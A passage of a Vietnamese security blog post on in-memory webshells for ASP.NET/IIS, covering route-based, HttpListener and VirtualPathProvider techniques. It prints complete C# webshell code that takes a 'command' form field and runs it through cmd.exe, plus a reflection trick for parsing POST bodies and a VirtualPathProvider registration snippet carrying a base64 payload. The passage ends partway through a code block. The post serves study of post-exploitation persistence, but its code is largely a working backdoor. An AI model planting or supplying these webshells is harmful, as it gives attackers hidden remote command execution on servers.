+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRoute : IRouteHandler {
+</span></span><span class=line><span class=cl>    public IHttpHandler GetHttpHandler(RequestContext requestContext){
+</span></span><span class=line><span class=cl>        return new CustomHandler(requestContext);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>public class CustomHandler : IHttpHandler{
+</span></span><span class=line><span class=cl>    public RequestContext RequestContext { get; private set; }
+</span></span><span class=line><span class=cl>    public CustomHandler(RequestContext context){
+</span></span><span class=line><span class=cl>        this.RequestContext = context;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    public void ProcessRequest(HttpContext context){
+</span></span><span class=line><span class=cl>        String cmd = context.Request.Form[&#34;command&#34;]; 
+</span></span><span class=line><span class=cl>        if (cmd != null){
+</span></span><span class=line><span class=cl>            HttpResponse response = context.Response;
+</span></span><span class=line><span class=cl>            Process p = new Process();
+</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd;
+</span></span><span class=line><span class=cl>            p.Start();
+</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+</span></span><span class=line><span class=cl>            response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    public bool IsReusable { get; }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Như này thì có thể lấy được response rồi:<br><img src=https://hackmd.io/_uploads/ryZToMjBbg.png loading=lazy alt=image><br>Mặc dù không thể khai báo cho có thể truy cập route memory webshell bằng đường dẫn tùy ý nhưng có thể sử dụng dấu {} để biểu diễn ký tự ngẫu nhiên. Mình ví dụ như này:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Route customRoute = new Route(&#34;route{xxx}&#34;, new CustomRoute());
+</span></span></code></pre></td></tr></table></div></div><p>Thì có thể sử dụng route memory webshell với đường dẫn &ldquo;route&rdquo; kết hợp với các ký tự bất kỳ:<br><img src=https://hackmd.io/_uploads/SkYm7YjS-x.png loading=lazy alt=image></p><h2 id=httplistener-memory-webshell>HTTPListener Memory Webshell</h2><p>HttpListener là 1 class thuộc .NET Base Class Library, cung cấp khả năng khởi tạo một HTTP server đơn giản và có khả năng tùy biến cao (nghe khá giống với <code>python3 -m http.server</code>) 👌<br>Không phụ thuộc hay chạy qua IIS cũng như không nằm trong các thành phần của một project ASP.NET, HttpListener chỉ cần truyền vào địa chỉ lắng nghe, port và đường dẫn để khởi tạo một web service.<br><img src=https://hackmd.io/_uploads/H1pTrdsSWg.png loading=lazy alt=image><br>Do đặc tính hoạt động là 1 service độc lập nên chắc chắn nó sẽ không lưu lại log trên server, đồng thời có thể run cùng port, cùng host với service web khiến nó khá khó phát hiện nếu như được deploy.<br>Tuy nhiên, trong các blog mình tham khảo thì họ có nói rằng kỹ thuật này chỉ có thể được triển khai với quyền System. Điều này khá khó xảy ra do thông thường user deploy webapps sẽ là user IIS (default iis apppool\{pool name}). Ngoại trừ một số trường hợp như đối với Microsoft Exchange sẽ mặc định chạy quyền System nên kỹ thuật này đã được sử dụng để làm post-exploit memshell sau khi khai thác lỗi deser <a class=link href=https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html target=_blank rel=noopener>CVE-2020-17144</a></p><h3 id=phân-tích>Phân tích</h3><p>Về cơ bản thì kỹ thuật này sẽ khởi tạo một service web riêng biệt nên sẽ không chạy chèn vào một class nào của service web hiện tại. Công việc còn lại là xử lý HTTP Request để nhận được đầu vào, xử lý logic và trả kết quả về tại response.<br>Tại namespace System.Net đã tồn tại System.Net.HttpListenerContext đóng vai trò nhận, xử lý và trả về kết quả cho một HTTP Request như là HttpContext thuộc namespace System.Web. Nhưng class HttpListenerRequest khá thô sơ và không có các phương thức xử lý input như là System.Web.Request, nên việc nhận và xử lý dữ liệu là điều khá khó khăn.<br>Giải pháp đưa ra là lấy hết dữ liệu trong object HttpListenerRequest và HttpListenerResponse, từ đó tự craft thành System.Web.HttpRequest để nhận/xử lý dữ liệu.<br>Cứ tưởng là ngon ăn, nhưng quá trình parse HTTP Request gặp vấn đề khi HttpRequest không nhận được tham số tại POST body request, mặc dù vẫn thực hiện được các hàm tĩnh. Để làm rõ hơn thì mình có đoạn code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HttpListenerContext context = listener.GetContext();
+</span></span><span class=line><span class=cl>HttpListenerRequest request = context.Request;
+</span></span><span class=line><span class=cl>HttpListenerResponse response = context.Response;
+</span></span><span class=line><span class=cl>try {
+</span></span><span class=line><span class=cl>    // Lấy data từ request
+</span></span><span class=line><span class=cl>    string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
+</span></span><span class=line><span class=cl>    // Đưa data về dạng byte
+</span></span><span class=line><span class=cl>    byte[] rawData = Encoding.Default.GetBytes(data);
+</span></span><span class=line><span class=cl>    // Khởi tao object HttpRequst thuộc namespace System.Web để sử dụng request linh hoạt hơn
+</span></span><span class=line><span class=cl>    HttpRequest req = new HttpRequest(&#34;&#34;, request.Url.ToString(), request.QueryString.ToString());
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    // Kiểm tra giá trị của biến test
+</span></span><span class=line><span class=cl>    String test = req.Form[&#34;test&#34;];
+</span></span><span class=line><span class=cl>    if (test != null) { Console.WriteLine(&#34;Parameter test = &#34; + test); }
+</span></span><span class=line><span class=cl>    else { Console.WriteLine(&#34;Parameter test is null!!!&#34;); }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>catch (Exception e){ return; }
+</span></span><span class=line><span class=cl>…
+</span></span><span class=line><span class=cl>CustomListener(&#34;http://localhost:8000/test/&#34;);
+</span></span></code></pre></td></tr></table></div></div><p>Khi gửi mình post đến service thì chỉ nhận được thông báo null, chứng tỏ HttpRequest không lấy được dữ liệu của POST body:<br><img src=https://hackmd.io/_uploads/SJJrtOorbe.png loading=lazy alt=image><br>Đến nước này thì mình cần đi vào source để xem xét rồi. Hàm xử lý thực chất sẽ đi qua method EnsureForm dùng để kiểm tra xem Form có hợp lệ hay không, sau đó trả về thuộc tính <code>_form</code> của object để xử lý, từ đó suy ra thuộc tính <code>_form</code> chính là nơi lưu trữ dữ liệu của POST body trong một HTTP Request:<br><img src=https://hackmd.io/_uploads/H1yFtOiB-e.png loading=lazy alt=image><br>Tại đây, EnsureForm check nếu thuộc tính <code>_form</code> là null và thuộc tính <code>_wr</code> khác null thì sẽ gọi đến FillInFormCollection để điền thông tin vào form mới, còn nếu như <code>_wr</code> là null thì tiến hành set thuộc tính cho form hiện tại là Read Only. Còn trong trường hợp <code>_form</code> đã tồn tại tức khác null sẽ trả về <code>_form</code> đó luôn:<br><img src=https://hackmd.io/_uploads/BkWptOorZg.png loading=lazy alt=image><br>Tiếp tục nhảy vào method FillInFormCollection, đây là nơi xử lý dữ liệu hay để điền dữ liệu vào <code>_form</code>. Do muốn xử lý kiểu key-param nên mình chú ý đến content-type application/x-www-form-urlencoded trước:<br><img src=https://hackmd.io/_uploads/HJNf5_orZx.png loading=lazy alt=image><br>Tại đây mình thấy dữ liệu được fill thông qua hàm FillFromEncodedBytes với 2 tham số: : dữ liệu dưới dạng byte và loại encoding.
+Còn lại, nếu như kiểu content-type là multipart/form-data, là dữ liệu được gửi lên có boundary, thường được dùng để upload file thì sẽ chạy vòng for để thêm giá trị của từng tham số một trong form theo thứ tự:<br><img src=https://hackmd.io/_uploads/B13Y5diH-x.png loading=lazy alt=image><br>Như vậy, để có thể lưu được dữ liệu trong POST body vào <code>_form</code> thì ta cần một trong hai điều kiện:
+<code>_wr</code> khác null hoặc <code>_form</code> khác null.
+Xem xét đến khả năng đầu tiên, <code>_wr</code> chỉ có thể được set trong quá trình khởi tạo object class HttpRequest. Chỉ có constructor đầu tiên có thể chèn được giá trị vào <code>_wr</code>, nhưng chỉ có constructor thứ 2 là public tức có thể gọi trực tiếp từ public class HttpRequest.<br><img src=https://hackmd.io/_uploads/BJEbs_srZg.png loading=lazy alt=image><br>Nếu vậy thì mình sẽ đi theo hướng thứ 2, làm cho <code>_form</code> khác null. Không cần phải gán thông qua việc khởi tạo một HttpWorkerRequest mà sử dụng reflection để khởi tạo một object có kiểu dữ liệu HttpValueCollection giống <code>_form</code>, và từ đó gọi đến method FillFromEncodedBytes, truyền thẳng dữ liệu của body request vào method đó. Đoạn mã thực hiện sẽ như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>FieldInfo</span> <span class=n>field</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetField</span><span class=p>(</span><span class=s2>&#34;_form&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>Type</span> <span class=n>formtype</span> <span class=o>=</span> <span class=n>field</span><span class=o>.</span><span class=n>FieldType</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>MethodInfo</span> <span class=n>method</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;FillFromEncodedBytes&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>ConstructorInfo</span> <span class=n>constructor</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span><span class=p>,</span> <span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>object</span> <span class=n>obj</span> <span class=o>=</span> <span class=n>constructor</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>method</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>rawData</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=n>field</span><span class=o>.</span><span class=n>SetValue</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>obj</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Thêm chỗ này vào đoạn code test và ốp nguyên request trước, lần này thì mình đã lấy được value cho param test:<br><img src=https://hackmd.io/_uploads/ryYFi_oHZe.png loading=lazy alt=image><br></p><h3 id=deploy-1>Deploy</h3><p>Đoạn code mình tạo một HTTPListener, chỉ thêm phần xử lý đầu vào và hiển thị ra ngoài thôi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>public</span> <span class=k>static</span> <span class=n>void</span> <span class=n>CustomListener</span><span class=p>(</span><span class=n>string</span> <span class=n>url</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=n>HttpListener</span> <span class=n>listener</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HttpListener</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>listener</span><span class=o>.</span><span class=n>Prefixes</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>listener</span><span class=o>.</span><span class=n>Start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>listener</span><span class=o>.</span><span class=n>IsListening</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>       <span class=n>HttpListenerContext</span> <span class=n>context</span> <span class=o>=</span> <span class=n>listener</span><span class=o>.</span><span class=n>GetContext</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>       <span class=n>HttpListenerRequest</span> <span class=n>request</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>HttpListenerResponse</span> <span class=n>response</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Response</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>Stream</span> <span class=n>stm</span> <span class=o>=</span> <span class=n>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>try</span><span class=p>{</span> 
+</span></span><span class=line><span class=cl>          <span class=n>string</span> <span class=n>data</span> <span class=o>=</span> <span class=n>new</span> <span class=n>StreamReader</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>InputStream</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span><span class=p>)</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>          <span class=n>byte</span><span class=p>[]</span> <span class=n>rawData</span> <span class=o>=</span> <span class=n>Encoding</span><span class=o>.</span><span class=n>Default</span><span class=o>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>data</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>          <span class=n>HttpRequest</span> <span class=n>req</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HttpRequest</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>Url</span><span class=o>.</span><span class=n>ToString</span><span class=p>(),</span> <span class=n>request</span><span class=o>.</span><span class=n>QueryString</span><span class=o>.</span><span class=n>ToString</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>          <span class=n>FieldInfo</span> <span class=n>field</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetField</span><span class=p>(</span><span class=s2>&#34;_form&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=n>Type</span> <span class=n>formtype</span> <span class=o>=</span> <span class=n>field</span><span class=o>.</span><span class=n>FieldType</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=n>MethodInfo</span> <span class=n>method</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;FillFromEncodedBytes&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=n>ConstructorInfo</span> <span class=n>constructor</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span><span class=p>,</span> <span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=n>object</span> <span class=n>obj</span> <span class=o>=</span> <span class=n>constructor</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=n>method</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>rawData</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>          <span class=n>field</span><span class=o>.</span><span class=n>SetValue</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>obj</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>          <span class=ne>String</span> <span class=n>cmd</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>Form</span><span class=p>[</span><span class=s2>&#34;command&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=o>!=</span> <span class=n>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>             <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;exit&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=n>listener</span><span class=o>.</span><span class=n>Stop</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>             <span class=p>}</span>
+</span></span><span class=line><span class=cl>             <span class=n>Process</span> <span class=n>p</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Process</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>StartInfo</span><span class=o>.</span><span class=n>FileName</span> <span class=o>=</span> <span class=s2>&#34;cmd.exe&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>StartInfo</span><span class=o>.</span><span class=n>Arguments</span> <span class=o>=</span> <span class=s2>&#34;/c&#34;</span> <span class=o>+</span> <span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>             <span class=n>p</span><span class=o>.</span><span class=n>Start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>             <span class=n>byte</span><span class=p>[]</span> <span class=n>output</span> <span class=o>=</span> <span class=n>Encoding</span><span class=o>.</span><span class=n>UTF8</span><span class=o>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span> <span class=o>+</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardError</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>             <span class=n>response</span><span class=o>.</span><span class=n>StatusCode</span> <span class=o>=</span> <span class=mi>200</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>             <span class=n>response</span><span class=o>.</span><span class=n>ContentLength64</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>Length</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>             <span class=n>stm</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>OutputStream</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>             <span class=n>stm</span><span class=o>.</span><span class=n>Write</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>output</span><span class=o>.</span><span class=n>Length</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=p>}</span>
+</span></span><span class=line><span class=cl>       <span class=p>}</span>
+</span></span><span class=line><span class=cl>       <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>e</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=n>CustomListener</span><span class=p>(</span><span class=s2>&#34;http://localhost:5000/memshell/&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Ngon luôn:<br><img src=https://hackmd.io/_uploads/HyK17KoBWl.png loading=lazy alt=image></p><h3 id=giới-hạn>Giới Hạn</h3><p>Câu hỏi đặt ra là, mình có đề cập đến việc kỹ thuật cần quyền System nhưng tại đây người dùng thông thường vẫn có thể triển khai được HttpListener Memory Webshell?<br>Để chạy một HttpListerner bắt buộc phải thêm đường dẫn đến HTTP Server thông qua dòng lệnh: HttpListener.Prefixes.Add, method này thực chất gọi đến HttpListener.AddPrefix, nơi sẽ tiếp tục gọi đến HttpListener.InternalAddPrefix và cuối cùng là HttpAddUrlToUrlGroup. Đây là method được import từ native dll httpapi.dll:<br><img src=https://hackmd.io/_uploads/SJoo-Forbl.png loading=lazy alt=image><br>Về chức năng, thông tin cũng như lưu ý của hàm này, Microsoft đã thông báo rõ rằng tham số pFullyQualifiedUrl chứa url truyền vào nếu như có cổng dịch vụ nhỏ hơn 1024 cần quyền System để thực thi, nếu không sẽ dính lỗi Access Denied:<br><img src=https://hackmd.io/_uploads/rkN5mYoBWg.png loading=lazy alt=image><br>Tức là trong trường hợp người dùng web không có quyền System, không thể tạo được HTTP Server thông qua HttpListener mà cổng dịch vụ nhỏ hơn 1024.<br>Ngoài việc sử dụng port thấp ra, nếu như muốn khởi tạo Server với IP không phải localhost/127.0.0.1 mà là IP của card mạng wifi hoặc ethernet cũng cần quyền System: đây chính là điểm yếu vì trong môi trường tấn công việc mở server bằng IP local là vô nghĩa. Ví dụ như ở đây địa chỉ IP card wifi của mình là 192.168.100.198:<br><img src=https://hackmd.io/_uploads/Hy8ZNForWl.png loading=lazy alt=image><br>Nếu như khởi tạo HttpListener là http://192.168.100.198:5000/memshell/ sẽ dính lỗi không có quyền, do người dùng deploy web đang là user thường:<br><img src=https://hackmd.io/_uploads/r1XmEtjS-x.png loading=lazy alt=image><br>Ngoài ra, sử dụng wildcard IP hoặc wildcard hostname như: <code>http://*:8080/</code>, <code>http://+:8080/</code> cũng yêu cầu quyền System để thực thi.</p><h2 id=virtualpath-memory-webshell>VirtualPath Memory Webshell</h2><p>Đây là kỹ thuật được sử dụng phổ biến nhất khi explot .NET Memory Webshell, được sử dụng làm method tạo memshell trên Godzilla: <a class=link href=https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs target=_blank rel=noopener>https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs</a><br>Để ví dụ VirtualPathProvider trực quan hơn thì mình có cách diễn giải như sau: Thông thường để truy cập file aspx thì trên hệ thống buộc phải tồn tại file tương ứng trong thư mục web vật lý, còn VirtualPathProvider giúp lưu trữ file File.aspx ở bất cứ đâu chứ không nhất thiết phải tồn tại trong hệ thống file vật lý tại server, có thể là lưu trong database,&mldr;<br><img src=https://hackmd.io/_uploads/S1Y4CYoS-g.png loading=lazy alt=image></p><h3 id=not-so-memshell>Not so memshell</h3><p>Từ khúc này mình sẽ viết tắt VirtualPathProvider = VPP.<br>Method RegisterVirtualPathProviderInternal chịu trách nhiệm thêm VPP mới vào hệ thống bằng cách lưu đường dẫn ảo truyền vào <code>_virtualPathProvider</code>, và đưa VPP được đăng ký trước đó vào method Initialize. Nơi mà VPP đã tồn tại được đưa vào <code>_previous</code>:<br><img src=https://hackmd.io/_uploads/ByIw-6jB-x.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/BkIc-TjBZe.png loading=lazy alt=image><br>Tức khi một VPP mới được thêm vào, VPP đã thêm trước đó được coi như một node trước và có thể truy cập thông qua thuộc tính Previous.<br>Khi một request web page đến, ứng dụng xét lần lượt từ VirtualPath mới nhất đến cũ nhất cho đến khi trùng khớp hoặc thuộc tính previous là null thì dừng lại. Và <code>_virtualPathProvider</code> tồn tại để chứa giá trị của node mới nhất được thêm vào. Cách tổ chức và duyệt phần tử như này khá giống với một danh sách liên kết đơn có 1 con trỏ head.
+Mình có thể đăng ký 1 VPP với nội dung tùy chỉnh bằng đoạn mã sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%
+</span></span><span class=line><span class=cl>string base64 = &#34;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpTY3JpcHQiICU+DQo8JSBSZXNwb25zZS5Xcml0ZSgiVmlydHVhbFBhdGggQ3JlYXRlZCBTdWNjZXNzZnVsbHkiKTsgJT4=&#34;;
+</span></span><span class=line><span class=cl>string content = Encoding.UTF8.GetString(System.Convert.FromBase64String(base64));
+</span></span><span class=line><span class=cl>string targetVirtualPath = &#34;/TestPath.aspx&#34;;
+</span></span><span class=line><span class=cl>try{
+</span></span><span class=line><span class=cl>    TestPathProvider testProvider = new TestPathProvider(targetVirtualPath, content);
+</span></span><span class=line><span class=cl>    HostingEnvironment.RegisterVirtualPathProvider(testProvider);
+</span></span><span class=line><span class=cl>    testProvider.InitializeLifetimeService();
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>catch (Exception error){
+</span></span><span class=line><span class=cl>    Console.WriteLine(error);
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Trigger file này sẽ tạo 1 VPP với đường dẫn <code>/TestPath.aspx</code>, cũng có thể coi là một fileless webshell:<br><img src=https://hackmd.io/_uploads/r1-IMTorWl.png loading=lazy alt=image><br>Để trở thành một kỹ thuật memshell đúng nghĩa, mình muốn exec command tại đường dẫn bất kỳ, cho nên đoạn code này là chưa đủ để đáp ứng điều kiện.</p><h3 id=virtualpath-at-its-finest>VirtualPath at its finest</h3><p>Trong lúc debug thì mình thấy có 2 method luôn được gọi khi truy cập bất kỳ path nào, đó là GetCacheKey và FileExists. Nhưng khi ngó đoạn code gen memshell của Godzilla, mình thấy code memshell được truyền vào method GetCacheKey. Để kiểm tra xem method nào được call trước, mình kiểm tra với 1 script đơn giản:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
